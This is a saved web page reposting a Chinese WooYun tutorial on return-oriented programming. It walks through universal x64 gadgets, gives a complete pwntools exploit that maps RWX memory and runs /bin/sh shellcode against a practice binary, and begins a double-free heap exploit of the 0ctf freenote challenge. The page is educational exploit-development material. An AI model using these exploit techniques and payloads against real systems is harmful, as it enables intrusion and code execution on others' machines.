@@ -1,0 +1,1052 @@
+<!DOCTYPE HTML>
+
+<!--
+ ______________ 
+< TUICOOL.COM >
+ -------------- 
+        \   ^__^
+         \  (**)\__$__$__
+            (__)\       )\/\
+             U  ||------|
+                ||     ||
+-->
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="tc-auth" content="MTU1Nzky+cefc514b570d92b90ea1fd1a5e720fa78d2ca451" />
+  <meta content="authenticity_token" name="csrf-param" />
+<meta content="kXqzXbeXutoqsg4w3VDjXHsJAWF1uju55CWdbulczKM=" name="csrf-token" />
+    <title>
+            一步一步学ROP之gadgets和2free篇 - 推酷
+   </title>
+    <meta name="description" content="一步一步学ROP之gadgets和2free篇"/>
+  <link rel="shortcut icon" href="http://static0.tuicool.com/favicon.ico" type="image/x-icon" />
+  <link href="http://static0.tuicool.com/images/icon114.png" rel="Bookmark" />
+  <link rel="apple-touch-icon" sizes="57x57" href="http://static1.tuicool.com/images/icon57.png" /> 
+  <link rel="apple-touch-icon" sizes="72x72" href="http://static2.tuicool.com/images/icon72.png" />  
+  <link rel="apple-touch-icon" sizes="114x114" href="http://static0.tuicool.com/images/icon114.png" />    
+  <link rel="apple-touch-icon" sizes="144x144" href="http://static1.tuicool.com/images/icon144.png"/>  
+  <link href="http://asset.tuicool.com/assets/application-79535689d4effa45d2ea7ede6503dd7f.css" media="screen" rel="stylesheet" type="text/css" />
+  <link href="http://static0.tuicool.com/assets/font-awesome.min.css" rel="stylesheet">
+  <script src="http://asset.tuicool.com/assets/application-7edeeea3a20493861059090224f774ae.js" type="text/javascript"></script>
+
+  <!--[if IE 7]>
+  <link rel="stylesheet" href="http://assets.tuicool.com/assets/font-awesome-ie7.min.css">
+  <![endif]--> 
+    <script type="text/javascript" src="http://static2.tuicool.com/assets/tip.js?t=3"></script>
+  
+  <script type="text/javascript" src="http://static1.tuicool.com/assets/spin.min.js"></script>
+<link rel="stylesheet" href="http://static0.tuicool.com/assets/github.css">
+
+</head>
+<body>
+  
+  <div id="header" class="navbar-fixed-top">
+    <div class="container">
+      <div class="navbar">
+        <div class="navbar-inner">
+          <a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse"> 
+            <span class="icon-bar"></span> 
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span> 
+          </a>
+          <a href="http://www.tuicool.com/" class="brand">推酷</a>        
+        <nav class="nav-collapse collapse">
+            <ul class="nav navbar primary-nav">                            
+              <li class="active">
+                <a href="http://www.tuicool.com/a/">
+                  文章
+                </a>
+              </li>              
+              <li class="">
+                <a href="http://www.tuicool.com/sites">
+                  站点
+                </a>
+              </li>
+              <li class="">
+                <a href="http://www.tuicool.com/topics">
+                  主题
+                </a>
+              </li>
+              <li class="">
+                <a href="http://huodong.tuicool.com/">
+                  活动
+                </a>
+              </li>
+                  <li class="">
+                    <a href="http://course.tuicool.com/">
+                      公开课
+                    </a>
+                  </li>
+              <li class="">
+                <a href="http://www.tuicool.com/mobile">
+                  APP
+                </a>
+              </li>
+              <li class="dropdown  ">
+                <a href="#" class="dropdown-toggle" data-toggle="dropdown">周刊 <b class="caret"></b></a>
+                <ul class="dropdown-menu">
+                  <li><a href="http://www.tuicool.com/mags">编程狂人</a></li>
+                  <li><a href="http://www.tuicool.com/mags/design">设计匠艺</a></li> 
+                  <li><a href="http://www.tuicool.com/mags/startup">创业周刊</a></li> 
+                  <li><a href="http://www.tuicool.com/mags/tech">科技周刊</a></li>      
+                  <li><a href="http://www.tuicool.com/mags/guru">Guru Weekly</a></li> 
+                  <li><a href="http://www.tuicool.com/articles/weekly">一周拾遗</a></li>                  
+                </ul>
+              </li>
+              
+              </ul>
+            <form class="navbar-search pull-left" action="http://www.tuicool.com/search">
+              <input type="text" class="search-query span2" name="kw" placeholder="搜索">
+            </form>
+            <ul class="nav pull-right">
+                          
+                <li class="dropdown">         
+                  <a href="#" class="dropdown-toggle" data-toggle="dropdown">
+                    <img alt="wolfzhang" src="http://static0.tuicool.com/images/0m.png">
+                    wolfzhang
+                    <b class="caret"></b>
+                  </a>
+                  <ul class="dropdown-menu">
+                    <li><a href='http://www.tuicool.com/user/462071652'>我的主页</a></li>
+                    <li><a href='http://www.tuicool.com/articles/my'>我的收藏</a></li>
+                    <li><a href="http://www.tuicool.com/settings">个人设置</a></li>           
+                    <li><a href="http://www.tuicool.com/notifications">消息通知</a></li>
+                    <li><a href="http://www.tuicool.com/bbs/go/issues">意见反馈</a></li>
+                    <li><a href="http://www.tuicool.com/logout">退出</a></li>
+                  </ul>
+                </li>
+            </ul>
+          </nav>
+        </div>
+      </div>
+  </div>   
+</div>
+  <div id ="flash_container" class="noPrint">    
+  </div>
+  
+  <div class="container-fluid">  
+      
+<div class="row-fluid article_row_fluid">
+    <div class="span8 contant article_detail_bg">
+        <h1>一步一步学ROP之gadgets和2free篇</h1>
+        <div class="article_meta">
+            <div style="margin-bottom: 5px;">
+            <span class="timestamp">时间&nbsp;2015-11-25 10:39:55
+            </span>
+            <span class="from">
+                <i class="icon-globe"></i>
+                    <a class="cut cut28 from" href="/sites/a2UJrq" target="_blank">WooYun知识库
+                    </a>
+            </span>
+            </div>
+            <div class="source">
+                <i style="float:left;">原文</i>&nbsp; 
+                <a class="cut cut70" href="http://drops.wooyun.org/binary/10638?utm_source=tuicool&amp;utm_medium=referral" style="display:inline-block;">http://drops.wooyun.org/binary/10638</a>
+            </div>
+            <div>
+                <span>主题</span>
+                <a href="/topics/11100145" target='_blank' >
+                    <span class="new-label">Shellcode</span>
+                </a>
+                <a href="/topics/11130000" target='_blank' >
+                    <span class="new-label">Python</span>
+                </a>
+                <a href="/topics/11350075" target='_blank' >
+                    <span class="new-label">寄存器</span>
+                </a>
+            </div>
+        </div>
+        <div class="article_body" id="nei">
+            <div ng-bind-html="postContentTrustedHtml"> 
+ <h2>0x00序</h2> 
+ <p>ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术，可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。上次我们主要讨论了linux_x64的ROP攻击。</p> 
+ <p> 一步一步学ROP之linux_x86篇 <a href="http://drops.wooyun.org/tips/6597" rel="nofollow,noindex">http://drops.wooyun.org/tips/6597</a> </p> 
+ <p> 一步一步学ROP之linux_x64篇 <a href="http://drops.wooyun.org/papers/7551" rel="nofollow,noindex">http://drops.wooyun.org/papers/7551</a> </p> 
+ <p>在这次的教程中我们会带来通用gadgets和堆漏洞利用的技巧，欢迎大家继续学习。</p> 
+ <p> 另外文中涉及代码可在我的github下载: <a href="https://github.com/zhengmin1989/ROP_STEP_BY_STEP" rel="nofollow,noindex">https://github.com/zhengmin1989/ROP_STEP_BY_STEP</a> </p> 
+ <h2>0x01 通用 gadgets part2</h2> 
+ <p> 上次讲到了 <code>__libc_csu_init()</code> 的一条万能gadgets，其实不光 <code>__libc_csu_init()</code> 里的代码可以利用，默认gcc还会有如下自动编译进去的函数可以用来查找gadgets。 </p> 
+ <pre class="prettyprint"><code>_init
+_start
+call_gmon_start
+deregister_tm_clones
+register_tm_clones
+__do_global_dtors_aux
+frame_dummy
+__libc_csu_init
+__libc_csu_fini
+_fini
+</code></pre> 
+ <p>除此之外在程序执行的过程中，CPU只会关注于PC指针的地址，并不会关注是否执行了编程者想要达到的效果。因此，通过控制PC跳转到某些经过稍微偏移过的地址会得到意想不到的效果。</p> 
+ <p> 比如说说我们反编译一下 <code>__libc_csu_init()</code> 这个函数的尾部： </p> 
+ <pre class="prettyprint"><code>gdb-peda$ disas __libc_csu_init
+Dump of assembler code for function __libc_csu_init:
+……
+	0x0000000000400606 &lt;+102&gt;:	movrbx,QWORD PTR [rsp+0x8]
+	0x000000000040060b &lt;+107&gt;:	movrbp,QWORD PTR [rsp+0x10]
+	0x0000000000400610 &lt;+112&gt;:	mov	 r12,QWORD PTR [rsp+0x18]
+	0x0000000000400615 &lt;+117&gt;:	mov	 r13,QWORD PTR [rsp+0x20]
+	0x000000000040061a &lt;+122&gt;:	mov	 r14,QWORD PTR [rsp+0x28]
+	0x000000000040061f &lt;+127&gt;:	mov	 r15,QWORD PTR [rsp+0x30]
+	0x0000000000400624 &lt;+132&gt;:	add	 rsp,0x38
+	0x0000000000400628 &lt;+136&gt;:	ret  
+</code>
+</pre> 
+ <p>可以发现我们可以通过rsp控制r12-r15的值，但我们知道x64下常用的参数寄存器是rdi和rsi，控制r12-r15并没有什么太大的用处。不要慌，虽然原程序本身用是为了控制r14和r15寄存器的值。如下面的反编译所示：</p> 
+ <pre class="prettyprint"><code>gdb-peda$ x/5i 0x000000000040061a
+   0x40061a &lt;__libc_csu_init+122&gt;:  mov    r14,QWORD PTR [rsp+0x28]
+   0x40061f &lt;__libc_csu_init+127&gt;:  mov    r15,QWORD PTR [rsp+0x30]
+   0x400624 &lt;__libc_csu_init+132&gt;:  add    rsp,0x38
+   0x400628 &lt;__libc_csu_init+136&gt;:  ret  
+</code></pre> 
+ <p>但是我们如果简单的对pc做个位移再反编译，我们就会发现esi和edi的值可以被我们控制了！如下面的反编译所示:</p> 
+ <pre class="prettyprint"><code>gdb-peda$ x/5i 0x000000000040061b
+	0x40061b &lt;__libc_csu_init+123&gt;:  movesi,DWORD PTR [rsp+0x28]
+	0x40061f &lt;__libc_csu_init+127&gt;:  mov	 r15,QWORD PTR [rsp+0x30]
+	0x400624 &lt;__libc_csu_init+132&gt;:  add	 rsp,0x38
+	0x400628 &lt;__libc_csu_init+136&gt;:  ret	 
+	0x400629:	 nop	 DWORD PTR [rax+0x0]
+gdb-peda$ x/5i 0x0000000000400620
+	0x400620 &lt;__libc_csu_init+128&gt;:  movedi,DWORD PTR [rsp+0x30]
+	0x400624 &lt;__libc_csu_init+132&gt;:  add	 rsp,0x38
+	0x400628 &lt;__libc_csu_init+136&gt;:  ret	 
+	0x400629:	 nop	 DWORD PTR [rax+0x0]
+	0x400630 &lt;__libc_csu_fini&gt;:  repz ret 
+</code>
+</pre> 
+ <p>虽然edi和esi只能控制低32位的数值，但已经可以满足我们的很多的rop需求了。</p> 
+ <p> 除了程序默认编译进去的函数，如果我们能得到libc.so或者其他库在内存中的地址，就可以获得到大量的可用的gadgets。比如上一篇文章中提到的通用gadget只能控制三个参数寄存器的值并且某些值只能控制32位，如果我们想要控制多个参数寄存器的值的话只能去寻找其他的gadgets了。这里就介绍一个 <code>_dl_runtime_resolve()</code> 中的gadget，通过这个gadget可以控制六个64位参数寄存器的值，当我们使用参数比较多的函数的时候（比如mmap和mprotect）就可以派上用场了。 </p> 
+ <p> 我们把 <code>_dl_runtime_resolve</code> 反编译可以得到： </p> 
+ <pre class="prettyprint"><code>0x7ffff7def200 &lt;_dl_runtime_resolve&gt;:   sub    rsp,0x38
+0x7ffff7def204 &lt;_dl_runtime_resolve+4&gt;: mov    QWORD PTR [rsp],rax
+0x7ffff7def208 &lt;_dl_runtime_resolve+8&gt;: mov    QWORD PTR [rsp+0x8],rcx
+0x7ffff7def20d &lt;_dl_runtime_resolve+13&gt;:    mov    QWORD PTR [rsp+0x10],rdx
+0x7ffff7def212 &lt;_dl_runtime_resolve+18&gt;:    mov    QWORD PTR [rsp+0x18],rsi
+0x7ffff7def217 &lt;_dl_runtime_resolve+23&gt;:    mov    QWORD PTR [rsp+0x20],rdi
+0x7ffff7def21c &lt;_dl_runtime_resolve+28&gt;:    mov    QWORD PTR [rsp+0x28],r8
+0x7ffff7def221 &lt;_dl_runtime_resolve+33&gt;:    mov    QWORD PTR [rsp+0x30],r9
+0x7ffff7def226 &lt;_dl_runtime_resolve+38&gt;:    movrsi,QWORD PTR [rsp+0x40]
+0x7ffff7def22b &lt;_dl_runtime_resolve+43&gt;:    movrdi,QWORD PTR [rsp+0x38]
+0x7ffff7def230 &lt;_dl_runtime_resolve+48&gt;:    call   0x7ffff7de8680 &lt;_dl_fixup&gt;
+0x7ffff7def235 &lt;_dl_runtime_resolve+53&gt;:    mov    r11,rax
+0x7ffff7def238 &lt;_dl_runtime_resolve+56&gt;:    mov    r9,QWORD PTR [rsp+0x30]
+0x7ffff7def23d &lt;_dl_runtime_resolve+61&gt;:    mov    r8,QWORD PTR [rsp+0x28]
+0x7ffff7def242 &lt;_dl_runtime_resolve+66&gt;:    movrdi,QWORD PTR [rsp+0x20]
+0x7ffff7def247 &lt;_dl_runtime_resolve+71&gt;:    movrsi,QWORD PTR [rsp+0x18]
+0x7ffff7def24c &lt;_dl_runtime_resolve+76&gt;:    movrdx,QWORD PTR [rsp+0x10]
+0x7ffff7def251 &lt;_dl_runtime_resolve+81&gt;:    movrcx,QWORD PTR [rsp+0x8]
+0x7ffff7def256 &lt;_dl_runtime_resolve+86&gt;:    movrax,QWORD PTR [rsp]
+0x7ffff7def25a &lt;_dl_runtime_resolve+90&gt;:    add    rsp,0x48
+0x7ffff7def25e &lt;_dl_runtime_resolve+94&gt;:    jmp    r11
+</code></pre> 
+ <p> 从 <code>0x7ffff7def235</code> 开始，就是这个通用gadget的地址了。通过这个gadget我们可以控制rdi，rsi，rdx，rcx， r8，r9的值。但要注意的是 <code>_dl_runtime_resolve()</code> 在内存中的地址是随机的。所以我们需要先用information leak得到 <code>_dl_runtime_resolve()</code> 在内存中的地址。那么 <code>_dl_runtime_resolve()</code> 的地址被保存在了哪个固定的地址呢？ </p> 
+ <p> 通过反编译level5程序我们可以看到 <code>write@plt()</code> 这个函数使用PLT [0] 去查找write函数在内存中的地址，函数jump过去的地址*0x600ff8其实就是 <code>_dl_runtime_resolve()</code> 在内存中的地址了。所以只要获取到0x600ff8这个地址保存的数据，就能够找到 <code>_dl_runtime_resolve()</code> 在内存中的地址： </p> 
+ <pre class="prettyprint"><code>0000000000400420 &lt;write@plt-0x10&gt;:
+  400420:   ff 35 ca 0b 20 00       pushq  0x200bca(%rip)        # 600ff0 &lt;_GLOBAL_OFFSET_TABLE_+0x8&gt;
+  400426:   ff 25 cc 0b 20 00       jmpq   *0x200bcc(%rip)        # 600ff8 &lt;_GLOBAL_OFFSET_TABLE_+0x10&gt;
+  40042c:   0f 1f 40 00             nopl   0x0(%rax)
+
+gdb-peda$ x/x 0x600ff8
+0x600ff8 &lt;_GLOBAL_OFFSET_TABLE_+16&gt;:    0x00007ffff7def200
+
+gdb-peda$ x/21i 0x00007ffff7def200
+   0x7ffff7def200 &lt;_dl_runtime_resolve&gt;:    sub    rsp,0x38
+   0x7ffff7def204 &lt;_dl_runtime_resolve+4&gt;:  mov    QWORD PTR [rsp],rax
+   0x7ffff7def208 &lt;_dl_runtime_resolve+8&gt;:  mov    QWORD PTR [rsp+0x8],rcx
+   0x7ffff7def20d &lt;_dl_runtime_resolve+13&gt;: mov    QWORD PTR 
+[rsp+0x10],rdx
+….
+</code></pre> 
+ <p>另一个要注意的是，想要利用这个gadget，我们还需要控制rax的值，因为gadget是通过rax跳转的：</p> 
+ <pre class="prettyprint"><code>0x7ffff7def235 &lt;_dl_runtime_resolve+53&gt;:    mov    r11,rax
+……
+0x7ffff7def25e &lt;_dl_runtime_resolve+94&gt;:    jmp    r11
+</code></pre> 
+ <p>所以我们接下来用ROPgadget查找一下libc.so中控制rax的gadget：</p> 
+ <pre class="prettyprint"><code>ROPgadget --binary libc.so.6 --only &quot;pop|ret&quot; | grep &quot;rax&quot;
+0x000000000001f076 : pop rax ; pop rbx ; pop rbp ; ret
+0x0000000000023950 : pop rax ; ret
+0x000000000019176e : pop rax ; ret 0xffed
+0x0000000000123504 : pop rax ; ret 0xfff0
+</code></pre> 
+ <p> <code>0x0000000000023950</code> 刚好符合我们的要求。有了 <code>pop rax</code> 和 <code>_dl_runtime_resolve</code> 这两个gadgets，我们就可以很轻松的调用想要的调用的函数了。 </p> 
+ <h2>0x02 利用mmap执行任意shellcode</h2> 
+ <p>看了这么多rop后是不是感觉我们利用rop只是用来执行system有点太不过瘾了？另外网上和msf里有那么多的shellcode难道在默认开启DEP的今天已经没有用处了吗？并不是的，我们可以通过mmap或者mprotect将某块内存改成RWX(可读可写可执行)，然后将shellcode保存到这块内存，然后控制pc跳转过去就可以执行任意的shellcode了，比如说建立一个socket连接等。下面我们就结合上一节中提到的通用gadgets来让程序执行一段shellcode。</p> 
+ <p> 我们测试的目标程序还是level5。在exp中，我们首先用上一篇中提到的 <code>_dl_runtime_resolve</code> 中的通用gadgets泄露出 <code>got_write</code> 和 <code>_dl_runtime_resolve</code> 的地址。 </p> 
+ <pre class="prettyprint"><code>#!python
+#rdi=  edi = r13,  rsi = r14, rdx = r15 
+#write(rdi=1, rsi=write.got, rdx=4)
+payload1 =  &quot;\x00&quot;*136
+payload1 += p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_write) + p64(8) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret
+payload1 += p64(0x4005F0) # movrdx, r15; movrsi, r14; movedi, r13d; call qword ptr [r12+rbx*8]
+payload1 += &quot;\x00&quot;*56
+payload1 += p64(main)
+
+#rdi=  edi = r13,  rsi = r14, rdx = r15 
+#write(rdi=1, rsi=linker_point, rdx=4)
+payload2 =  &quot;\x00&quot;*136
+payload2 += p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(got_write) + p64(1) + p64(linker_point) + p64(8) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret
+payload2 += p64(0x4005F0) # movrdx, r15; movrsi, r14; movedi, r13d; call qword ptr [r12+rbx*8]
+payload2 += &quot;\x00&quot;*56
+payload2 += p64(main)
+</code></pre> 
+ <p>随后就可以根据偏移量和泄露的地址计算出其他gadgets的地址。</p> 
+ <pre class="prettyprint"><code>#!python
+shellcode = ( &quot;\x48\x31\xc0\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e&quot; +
+	&quot;\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89&quot; +
+	&quot;\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05&quot; )
+shellcode_addr = 0xbeef0000
+#mmap(rdi=shellcode_addr, rsi=1024, rdx=7, rcx=34, r8=0, r9=0)
+payload3 =  &quot;\x00&quot;*136
+payload3 += p64(pop_rax_ret) + p64(mmap_addr)
+payload3 += p64(linker_addr+0x35) + p64(0) + p64(34) + p64(7) + p64(1024) + p64(shellcode_addr) + p64(0) + p64(0) + p64(0) + p64(0)
+#read(rdi=0, rsi=shellcode_addr, rdx=1024)
+payload3 += p64(pop_rax_ret) + p64(plt_read)
+payload3 += p64(linker_addr+0x35) + p64(0) + p64(0) + p64(1024) + p64(shellcode_addr) + p64(0) + p64(0) + p64(0) + p64(0) + p64(0)
+payload3 += p64(shellcode_addr)
+</code>
+</pre> 
+ <p> 然后我们利用 <code>_dl_runtime_resolve</code> 里的通用gadgets调用 <code>mmap(rdi=shellcode_addr, rsi=1024, rdx=7, rcx=34, r8=0, r9=0)</code> ,开辟一段RWX的内存在 <code>0xbeef0000</code> 处。随后我们使用 <code>read(rdi=0, rsi=shellcode_addr, rdx=1024)</code> ,把我们想要执行的shellcode读入到 <code>0xbeef0000</code> 这段内存中。最后再将指针跳转到shellcode处就可执行我们想要执行的任意代码了。 </p> 
+ <p>完整的exp8.py代码如下:</p> 
+ <pre class="prettyprint"><code>#!python
+#!/usr/bin/env python
+frompwn import *    
+elf = ELF('level5')
+libc = ELF('libc.so.6') 
+p = process('./level5')
+#p = remote('127.0.0.1',10001)  
+got_write = elf.got['write']
+print &quot;got_write: &quot; + hex(got_write)
+got_read = elf.got['read']
+print &quot;got_read: &quot; + hex(got_read)
+plt_read = elf.symbols['read']
+print &quot;plt_read: &quot; + hex(plt_read)
+linker_point = 0x600ff8
+print &quot;linker_point: &quot; + hex(linker_point)
+got_pop_rax_ret = 0x0000000000023970
+print &quot;got_pop_rax_ret: &quot; + hex(got_pop_rax_ret)    
+main = 0x400564 
+off_system_addr = libc.symbols['write'] - libc.symbols['system']
+print &quot;off_system_addr: &quot; + hex(off_system_addr)
+off_mmap_addr = libc.symbols['write'] - libc.symbols['mmap']
+print &quot;off_mmap_addr: &quot; + hex(off_mmap_addr)
+off_pop_rax_ret = libc.symbols['write'] - got_pop_rax_ret
+print &quot;off_pop_rax_ret: &quot; + hex(off_pop_rax_ret)    
+#rdi=  edi = r13,  rsi = r14, rdx = r15 
+#write(rdi=1, rsi=write.got, rdx=4)
+payload1 =  &quot;\x00&quot;*136
+payload1 += p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_write) + p64(8) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret
+payload1 += p64(0x4005F0) # movrdx, r15; movrsi, r14; movedi, r13d; call qword ptr [r12+rbx*8]
+payload1 += &quot;\x00&quot;*56
+payload1 += p64(main)   
+p.recvuntil(&quot;Hello, World\n&quot;)   
+print &quot;\n#############sending payload1#############\n&quot;
+p.send(payload1)
+sleep(1)    
+write_addr = u64(p.recv(8))
+print &quot;write_addr: &quot; + hex(write_addr)
+mmap_addr = write_addr - off_mmap_addr
+print &quot;mmap_addr: &quot; + hex(mmap_addr)
+pop_rax_ret = write_addr - off_pop_rax_ret
+print &quot;pop_rax_ret: &quot; + hex(pop_rax_ret)    
+#rdi=  edi = r13,  rsi = r14, rdx = r15 
+#write(rdi=1, rsi=linker_point, rdx=4)
+payload2 =  &quot;\x00&quot;*136
+payload2 += p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(got_write) + p64(1) + p64(linker_point) + p64(8) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret
+payload2 += p64(0x4005F0) # movrdx, r15; movrsi, r14; movedi, r13d; call qword ptr [r12+rbx*8]
+payload2 += &quot;\x00&quot;*56
+payload2 += p64(main)   
+p.recvuntil(&quot;Hello, World\n&quot;)   
+print &quot;\n#############sending payload2#############\n&quot;
+p.send(payload2)
+sleep(1)    
+linker_addr = u64(p.recv(8))
+print &quot;linker_addr + 0x35: &quot; + hex(linker_addr + 0x35)  
+p.recvuntil(&quot;Hello, World\n&quot;)   
+shellcode = ( &quot;\x48\x31\xc0\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e&quot; +
+	&quot;\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89&quot; +
+	&quot;\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05&quot; )  
+#   GADGET
+#   0x7ffff7def235 &lt;_dl_runtime_resolve+53&gt;:    mov    r11,rax
+#   0x7ffff7def238 &lt;_dl_runtime_resolve+56&gt;:    mov    r9,QWORD PTR [rsp+0x30]
+#   0x7ffff7def23d &lt;_dl_runtime_resolve+61&gt;:    mov    r8,QWORD PTR [rsp+0x28]
+#   0x7ffff7def242 &lt;_dl_runtime_resolve+66&gt;:    movrdi,QWORD PTR [rsp+0x20]
+#   0x7ffff7def247 &lt;_dl_runtime_resolve+71&gt;:    movrsi,QWORD PTR [rsp+0x18]
+#   0x7ffff7def24c &lt;_dl_runtime_resolve+76&gt;:    movrdx,QWORD PTR [rsp+0x10]
+#   0x7ffff7def251 &lt;_dl_runtime_resolve+81&gt;:    movrcx,QWORD PTR [rsp+0x8]
+#   0x7ffff7def256 &lt;_dl_runtime_resolve+86&gt;:    movrax,QWORD PTR [rsp]
+#   0x7ffff7def25a &lt;_dl_runtime_resolve+90&gt;:    add    rsp,0x48
+#   0x7ffff7def25e &lt;_dl_runtime_resolve+94&gt;:    jmp    r11  
+shellcode_addr = 0xbeef0000 
+#mmap(rdi=shellcode_addr, rsi=1024, rdx=7, rcx=34, r8=0, r9=0)
+payload3 =  &quot;\x00&quot;*136
+payload3 += p64(pop_rax_ret) + p64(mmap_addr)
+payload3 += p64(linker_addr+0x35) + p64(0) + p64(34) + p64(7) + p64(1024) + p64(shellcode_addr) + p64(0) + p64(0) + p64(0) + p64(0) 
+#read(rdi=0, rsi=shellcode_addr, rdx=1024)
+payload3 += p64(pop_rax_ret) + p64(plt_read)
+payload3 += p64(linker_addr+0x35) + p64(0) + p64(0) + p64(1024) + p64(shellcode_addr) + p64(0) + p64(0) + p64(0) + p64(0) + p64(0)  
+payload3 += p64(shellcode_addr) 
+print &quot;\n#############sending payload3#############\n&quot;
+p.send(payload3)
+sleep(1)    
+#raw_input()    
+p.send(shellcode+&quot;\n&quot;)
+sleep(1)    
+p.interactive()
+</code>
+</pre> 
+ <p>成功pwn后的效果如下：</p> 
+ <pre class="prettyprint"><code>$ python exp8.py 
+[+] Started program './level5'
+got_write: 0x601000
+got_read: 0x601008
+plt_read: 0x400440
+linker_point: 0x600ff8
+got_pop_rax_ret: 0x23950
+off_mmap_addr: -0x9770
+off_pop_rax_ret: 0xc2670
+
+#############sending payload1#############
+
+write_addr: 0x7f9d39d95fc0
+mmap_addr: 0x7f9d39d9f730
+pop_rax_ret: 0x7f9d39cd3950
+
+#############sending payload2#############
+
+linker_addr + 0x35: 0x7f9d3a083235
+
+#############sending payload3#############
+
+[*] Switching to interactive mode
+$ whoami
+mzheng
+</code></pre> 
+ <h2>0x03 堆漏洞利用之double free</h2> 
+ <p> 讲了那么多stack overflow的例子，我们现在换换口味，先从double free开始讲一下堆漏洞的利用。Double free的意思是一个已经被free的内存块又被free了第二次。正常情况下，如果double free，系统会检测出该内存块已经被free过了，不能被free第二次，程序会报错然后退出。但是如果我们精心构造一个假的内存块就可骗过系统的检测，然后得到内存地址任意写的权限。随后就可以修改got表将接下来会执行的函数替换成system()再将参数改为我们想要执行的指令，比如 <code>&quot;/bin/sh&quot;</code> 。最后就可以执行 <code>system(&quot;/bin/sh&quot;)</code> 了。 </p> 
+ <p>想要学习double free，首先要了解什么是free chunk和allocated chunk。这个在网上有大量的资料，请感兴趣的同学自学。</p> 
+ <p> <img src="http://img2.tuicool.com/UveQze.jpg!web" class="alignCenter" /> </p> 
+ <p>然后要了解Fast bin，Unsorted bin，Small bin和Large bin的概念。这个可以看这篇文章学习：</p> 
+ <p> <a href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/" rel="nofollow,noindex">https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/</a> </p> 
+ <p>除此之外还有个gdb工具可以帮助我们查看内存中堆的信息，这对我们调试程序会有很大的帮助:</p> 
+ <p> <a href="https://github.com/cloudburst/libheap" rel="nofollow,noindex">https://github.com/cloudburst/libheap</a> </p> 
+ <p>等到对堆的基本概念了解的差多了就可以学习如何利用unlink来做到内存写了。在最早版本的unlink中对内存chunk是没有任何检测的，因此我们可以很容易的做到内存任意写。但现在版本的libc中会对free的那个chunk进行检测，这个chunk的前一个chunk的bk指针和这个chunk的后一个chunk的fd指针必须指向这个即将free的chunk才行。为了bypass这个检测，我们必须在内存中找到一个地址X指向P，然后将P的fd和bk指向X。最后再触发double free的unlink，就可以将P地址的值设置为X了。</p> 
+ <p> <img src="http://img2.tuicool.com/ZBzM32.jpg!web" class="alignCenter" /> </p> 
+ <p>我们这次使用0ctf中的freenote这道题来实践一下double free漏洞的利用。执行这个程序我能看到这其实就是一个note记事本程序。通过new note和delete note可以malloc()和free()内存。</p> 
+ <pre class="prettyprint"><code>$ ./freenote_x64 
+== 0ops Free Note ==
+1. List Note
+2. New Note
+3. Edit Note
+4. Delete Note
+5. Exit
+====================
+</code></pre> 
+ <p>但是这个程序有两个漏洞，一个是建立新note的时候在note的结尾处没有加&quot;\0&quot;因此会造成堆或者栈的地址泄露，另一个问题就是在delete note的时候，并不会检测这个note是不是已经被删除过了，因此可以删除一个note两遍，造成double free。</p> 
+ <p>首先我们要泄露libc和heap在内存中的地址。因为note的结尾没有&quot;\0&quot;，因此在输出时会把后面的内容打印出来。因为freelist的头部保存在了libc的.bss段，因此我们可以见通过删除两个note再删除一个note，然后再建立一个新note的方法来泄露出libc在内存中的地址：</p> 
+ <pre class="prettyprint"><code>#!python
+notelen=0x80
+
+new_note(&quot;A&quot;*notelen)
+new_note(&quot;B&quot;*notelen)
+delete_note(0)
+
+new_note(&quot;\xb8&quot;)
+list_note()
+p.recvuntil(&quot;0. &quot;)
+leak = p.recvuntil(&quot;\n&quot;)
+
+print leak[0:-1].encode('hex')
+leaklibcaddr = u64(leak[0:-1].ljust(8, '\x00'))
+print hex(leaklibcaddr)
+delete_note(1)
+delete_note(0)
+
+system_sh_addr = leaklibcaddr - 0x3724a8
+print &quot;system_sh_addr: &quot; + hex(system_sh_addr)
+binsh_addr = leaklibcaddr - 0x23e7f1
+print &quot;binsh_addr: &quot; + hex(binsh_addr)
+</code></pre> 
+ <p>同样的如果让某个非使用中 chunk 的fd栏位指向另一个 chunk，并且让note的内容刚好接上，就可以把 chunk在堆上的位置给洩漏出来。这样我们就能得到堆的基址。</p> 
+ <pre class="prettyprint"><code>#!python
+notelen=0x10    
+
+new_note(&quot;A&quot;*notelen)
+new_note(&quot;B&quot;*notelen)
+new_note(&quot;C&quot;*notelen)
+new_note(&quot;D&quot;*notelen)
+delete_note(2)
+delete_note(0)  
+
+new_note(&quot;AAAAAAAA&quot;)
+list_note()
+p.recvuntil(&quot;0. AAAAAAAA&quot;)
+leak = p.recvuntil(&quot;\n&quot;)    
+
+print leak[0:-1].encode('hex')
+leakheapaddr = u64(leak[0:-1].ljust(8, '\x00'))
+print hex(leakheapaddr) 
+
+delete_note(0)
+delete_note(1)
+delete_note(3)  
+
+notelen = 0x80  
+
+new_note(&quot;A&quot;*notelen)
+new_note(&quot;B&quot;*notelen)
+new_note(&quot;C&quot;*notelen)   
+
+delete_note(2)
+delete_note(1)
+delete_note(0)
+</code></pre> 
